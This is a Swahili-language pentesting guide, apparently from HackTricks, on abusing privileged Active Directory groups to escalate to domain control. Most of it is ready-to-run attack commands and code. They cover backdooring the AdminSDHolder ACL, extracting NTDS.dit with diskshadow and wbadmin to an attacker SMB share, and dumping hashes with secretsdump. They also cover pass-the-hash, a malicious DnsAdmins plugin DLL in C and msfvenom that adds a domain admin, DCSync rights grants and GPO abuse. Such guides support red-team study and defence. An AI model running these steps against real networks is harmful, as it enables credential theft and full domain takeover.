# Vikundi Vilivyo na Upendeleo

{{#include ../../banners/hacktricks-training.md}}

## Vikundi Vinavyojulikana Vyenye Vibali vya Usimamizi

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Kikundi hiki kimepewa mamlaka ya kuunda akaunti na vikundi ambavyo si Administrators kwenye domain. Zaidi ya hayo, kinaruhusu local login kwenye Domain Controller (DC).

Ili kubaini wanachama wa kikundi hiki, amri ifuatayo inaendeshwa:
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Kuongeza watumiaji wapya kunaruhusiwa, pamoja na kuingia kwa ndani (local login) kwenye DC.

## AdminSDHolder group

Orodha ya udhibiti wa upatikanaji (ACL) ya kikundi cha **AdminSDHolder** ni muhimu kwani inaweka ruhusa kwa ajili ya makundi yote ya "protected" ndani ya Active Directory, ikiwemo makundi yenye ruhusa za juu. Mfumo huu unahakikisha usalama wa makundi haya kwa kuzuia mabadiliko yasiyoruhusiwa.

Mshambuliaji anaweza kutumia hili kwa kuhariri ACL ya kikundi cha **AdminSDHolder**, na kumpa mtumiaji wa kawaida ruhusa kamili. Hii itampa mtumiaji huyo udhibiti kamili juu ya makundi yote yaliyolindwa. Ikiwa ruhusa za mtumiaji huyu zitabadilishwa au kuondolewa, zitarejeshwa moja kwa moja ndani ya saa moja kutokana na muundo wa mfumo.

Nyaraka za hivi karibuni za Windows Server bado zinachukulia vikundi kadhaa vilivyojengwa vya operator kama vitu vilivyo **protected** (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins`, etc.). Mchakato wa **SDProp** unaendeshwa kwenye **PDC Emulator** kila dakika 60 kwa chaguo-msingi, unaweka alama `adminCount=1`, na kuzima inheritance kwenye vitu vilivyolindwa. Hii ni ya msaada kwa persistence na pia kwa kuwatafuta watumiaji wenye ruhusa waliokuwa waliondolewa kutoka kwenye kikundi kilicholindwa lakini bado wana non-inheriting ACL.

Amri za kukagua wanachama na kubadilisha ruhusa ni pamoja na:
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
Select-Object distinguishedName
```
Skripti inapatikana ili kuharakisha mchakato wa urejeshaji: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Kwa maelezo zaidi, tembelea [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## AD Recycle Bin

Uanachama katika kundi hili unaruhusu kusoma vitu vilivyofutwa vya Active Directory, ambazo zinaweza kufichua taarifa nyeti:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
Hii ni muhimu kwa **kupata upya njia za ruhusa zilizopita**. Vitu vilivyofutwa bado vinaweza kufichua `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, SPNs za zamani, au DN ya kikundi chenye ruhusa kilichofutwa ambacho kinaweza kurejeshwa baadaye na operator mwingine.
```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
-Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```
### Ufikiaji wa Domain Controller

Ufikiaji wa faili kwenye DC umewekewa vizuizi isipokuwa mtumiaji ni sehemu ya kikundi cha `Server Operators`, ambacho hubadilisha kiwango cha ufikiaji.

### Kuinua Vibali

Kwa kutumia `PsService` au `sc` kutoka Sysinternals, mtu anaweza kuchunguza na kubadilisha ruhusa za huduma. Kikundi cha `Server Operators`, kwa mfano, kina udhibiti kamili juu ya huduma fulani, kuruhusu utekelezaji wa amri yoyote na kuinua vibali:
```cmd
C:\> .\PsService.exe security AppReadiness
```
Amri hii inaonyesha kwamba `Server Operators` wana ufikiaji kamili, ikiruhusu udhibiti wa services ili kupata elevated privileges.

## Backup Operators

Uanachama katika kundi la `Backup Operators` kunatoa ufikiaji wa filesystem ya `DC01` kutokana na privileges `SeBackup` na `SeRestore`. Haki hizi zinaruhusu folder traversal, listing, na file copying, hata bila ruhusa wazi, kwa kutumia flag `FILE_FLAG_BACKUP_SEMANTICS`. Inahitajika kutumia scripts maalum kwa mchakato huu.

Ili kuorodhesha wanachama wa group, tekeleza:
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Shambulio la Ndani

Ili kutumia vibali hivi kwenye mashine ya ndani, hatua zifuatazo zinafanywa:

1. Ingiza maktaba zinazohitajika:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Wezesha na thibitisha `SeBackupPrivilege`:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Pata na nakili faili kutoka kwenye saraka zilizozuiliwa, kwa mfano:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### Shambulio la AD

Ufikaji wa moja kwa moja kwenye mfumo wa faili wa Domain Controller unaruhusu wizi wa hifadhidata ya `NTDS.dit`, ambayo ina hashi zote za NTLM za watumiaji na kompyuta za domain.

#### Kutumia diskshadow.exe

1. Unda shadow copy ya drive `C`:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Nakili `NTDS.dit` kutoka kwa shadow copy:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Kwa njia mbadala, tumia `robocopy` kwa kunakili faili:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Toa `SYSTEM` na `SAM` ili kupata hash:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Pata hashes zote kutoka `NTDS.dit`:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. Baada ya uchimbaji: Pass-the-Hash to DA
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### Kutumia wbadmin.exe

1. Sanidi filesystem ya NTFS kwa SMB server kwenye mashine ya mshambuliaji na cache SMB credentials kwenye mashine lengwa.
2. Tumia `wbadmin.exe` kwa chelezo la mfumo na uchomaji wa `NTDS.dit`:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

Kwa maonyesho ya vitendo, angalia [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Wajumbe wa kikundi cha **DnsAdmins** wanaweza kutumia vibali vyao kupakia DLL yoyote yenye vibali za SYSTEM kwenye DNS server, ambayo mara nyingi huwa kwenye Domain Controllers. Uwezo huu unatoa fursa kubwa za exploitation.

Ili kuorodhesha wajumbe wa kikundi cha DnsAdmins, tumia:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Execute arbitrary DLL (CVE‑2021‑40469)

> [!NOTE]
> Utaifa huu unaruhusu utekelezaji wa msimbo wowote kwa ruhusa za SYSTEM katika huduma ya DNS (kwa kawaida ndani ya DCs). Tatizo hili lilirekebishwa mwaka 2021.

Wajumbe wanaweza kufanya DNS server i-load DLL yoyote (ama kwa local au kutoka kwenye remote share) kwa kutumia amri kama:
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Kuanza upya huduma ya DNS (ambayo inaweza kuhitaji ruhusa za ziada) ni muhimu ili DLL ipakwe:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Kwa maelezo zaidi kuhusu vektori hii ya shambulio, rejea ired.team.

#### Mimilib.dll

Pia inawezekana kutumia mimilib.dll kwa ajili ya kutekeleza amri, kuibadilisha ili itekeleze amri maalum au reverse shells. [Check this post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) for more information.

### Rekodi ya WPAD kwa MitM

DnsAdmins wanaweza kuchezea rekodi za DNS ili kufanya Man-in-the-Middle (MitM) shambulio kwa kuunda rekodi ya WPAD baada ya kuzima global query block list. Tools like Responder or Inveigh zinaweza kutumika kwa spoofing na kukamata trafiki ya mtandao.

### Event Log Readers
Wanachama wanaweza kufikia event logs, na wanaweza kupata taarifa nyeti kama nywila wazi au maelezo ya utekelezaji wa amri:
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Ruhusa za Exchange Windows

Kikundi hiki kinaweza kubadilisha DACLs kwenye domain object, na kwa hivyo kinaweza kutoa ruhusa za DCSync. Mbinu za privilege escalation zinazotumia kikundi hiki zimetajwa kwa undani katika Exchange-AD-Privesc GitHub repo.
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
Ikiwa unaweza kutenda kama mwanachama wa kikundi hiki, matumizi ya kawaida ni kumpa mhusika anayedhibitiwa na mshambuliaji haki za replication zinazohitajika kwa [DCSync](dcsync.md):
```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```
Kihistoria, **PrivExchange** ilichanganya mailbox access, coerced Exchange authentication, na LDAP relay ili kufikia primitive hii. Hata pale njia hiyo ya relay itakapopunguzwa, uanachama wa moja kwa moja katika `Exchange Windows Permissions` au udhibiti wa Exchange server bado ni njia ya thamani kubwa kwa domain replication rights.

## Hyper-V Administrators

Hyper-V Administrators wana ufikiaji kamili wa Hyper-V, ambao unaweza kutumiwa kupata udhibiti wa virtualized Domain Controllers. Hii inajumuisha cloning live DCs na extracting NTLM hashes kutoka kwenye faili ya `NTDS.dit`.

### Mfano wa Utekelezaji

Matumizi ya vitendo kwa kawaida ni **offline access to DC disks/checkpoints** badala ya mbinu za zamani za host-level LPE. Ukiwa na ufikiaji wa Hyper-V host, operator anaweza checkpoint au ku-export virtualized Domain Controller, mount the VHDX, na extract `NTDS.dit`, `SYSTEM`, na siri nyingine bila kugusa LSASS ndani ya guest:
```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```
Kutoka hapo, tumia tena workflow ya `Backup Operators` kunakili `Windows\NTDS\ntds.dit` na registry hives nje ya mtandao.

## Group Policy Creators Owners

Kikundi hiki kinawawezesha wanachama kuunda Group Policies ndani ya domain. Hata hivyo, wanachama wake hawawezi kutekeleza Group Policies kwa watumiaji au makundi, wala kuhariri GPOs zilizopo.

Tofauti muhimu ni kwamba **muumba anakuwa mmiliki wa GPO mpya** na kawaida hupata haki za kutosha kuihariri baadaye. Hii inamaanisha kikundi hiki kinavutia wakati unaweza:

- kuunda malicious GPO na kumshawishi admin kuilinki kwenye OU/domain lengwa
- kuhariri GPO uliyounda ambalo tayari lime-linkiwa mahali pa manufaa
- kutumia kwa njia mbaya haki nyingine ya delegated inayokuruhusu ku-link GPOs, wakati kikundi hiki kinakupa upande wa kuhariri

Kutumia vibaya kwa vitendo kwa kawaida inamaanisha kuongeza **Immediate Task**, **startup script**, **local admin membership**, au mabadiliko ya **user rights assignment** kupitia SYSVOL-backed policy files.
```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```
If editing the GPO manually through `SYSVOL`, remember the change is not enough by itself: `versionNumber`, `GPT.ini`, and sometimes `gPCMachineExtensionNames` must also be updated or clients will ignore the policy refresh.

## Organization Management

Katika mazingira ambapo **Microsoft Exchange** imewekwa, kundi maalum linalojulikana kama **Organization Management** lina uwezo mkubwa. Kundi hili lina ruhusa za kipekee za **kupata mailboxes za watumiaji wote wa domain** na linadumisha **udhibiti kamili juu ya 'Microsoft Exchange Security Groups'** Organizational Unit (OU). Udhibiti huu unajumuisha kundi la **`Exchange Windows Permissions`**, ambalo linaweza kutumiwa kwa privilege escalation.

### Matumizi ya Privilege na Amri

#### Print Operators

Wanachama wa **Print Operators** wamepewa haki kadhaa, zikiwemo **`SeLoadDriverPrivilege`**, ambayo huwapa uwezo wa **kuingia moja kwa moja kwenye Domain Controller (log on locally)**, kuizima, na kusimamia printers. Ili kutumia haki hizi, hasa ikiwa **`SeLoadDriverPrivilege`** haionekani chini ya muktadha usio na elevation, ni lazima kupitisha User Account Control (UAC).

Kuorodhesha wanachama wa kundi hili, amri ifuatayo ya PowerShell inatumiwa:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Kwenye Domain Controllers kikundi hiki ni hatari kwa sababu sera ya chaguo-msingi ya Domain Controller inampa **`SeLoadDriverPrivilege`** `Print Operators`. Ikiwa utapata token iliyoinuliwa kwa mwanachama wa kikundi hiki, unaweza kuwezesha privilege hiyo na kupakia driver iliyosainiwa lakini yenye udhaifu ili kuruka hadi kernel/SYSTEM. Kwa maelezo ya kushughulikia tokeni, angalia [Access Tokens](../windows-local-privilege-escalation/access-tokens.md).

#### Remote Desktop Users

Wanachama wa kikundi hiki wanapewa ufikiaji kwa PCs kupitia Remote Desktop Protocol (RDP). Kuorodhesha wanachama hawa, amri za PowerShell zipo:
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Maelezo zaidi kuhusu kutumia RDP yanaweza kupatikana katika rasilimali maalum za pentesting.

#### Watumiaji wa Usimamizi wa Mbali

Wanachama wanaweza kufikia PC kupitia **Windows Remote Management (WinRM)**. Uorodheshaji wa wanachama hawa unafanywa kwa:
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Kwa exploitation techniques zinazohusiana na **WinRM**, nyaraka maalum zinapaswa kusomwa.

#### Server Operators

Kikundi hiki kina ruhusa za kufanya usanidi mbalimbali kwenye Domain Controllers, ikiwa ni pamoja na haki za backup na restore, kubadili saa ya mfumo, na kuzima mfumo. Ili kuorodhesha wanachama, amri iliyotolewa ni:
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
Kwenye Domain Controllers, `Server Operators` kwa kawaida wanapata haki za kutosha za **kurekebisha au kuanzisha/kusimamisha huduma** na pia hupata `SeBackupPrivilege`/`SeRestorePrivilege` kupitia sera ya DC ya chaguomsingi. Kivitendo, hii inawafanya kuwa daraja kati ya **service-control abuse** na **NTDS extraction**:
```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```
Ikiwa ACL ya huduma inampa kundi hili haki za kubadilisha/kuanza, elekeza huduma kwenye amri yoyote, ianze kama `LocalSystem`, kisha urejeshe `binPath` ya awali. Ikiwa udhibiti wa huduma umezuiliwa, rudi kutumia mbinu za `Backup Operators` zilizo hapo juu ili kunakili `NTDS.dit`.

## Marejeo <a href="#references" id="references"></a>

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
- [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [https://labs.withsecure.com/tools/sharpgpoabuse](https://labs.withsecure.com/tools/sharpgpoabuse)


{{#include ../../banners/hacktricks-training.md}}
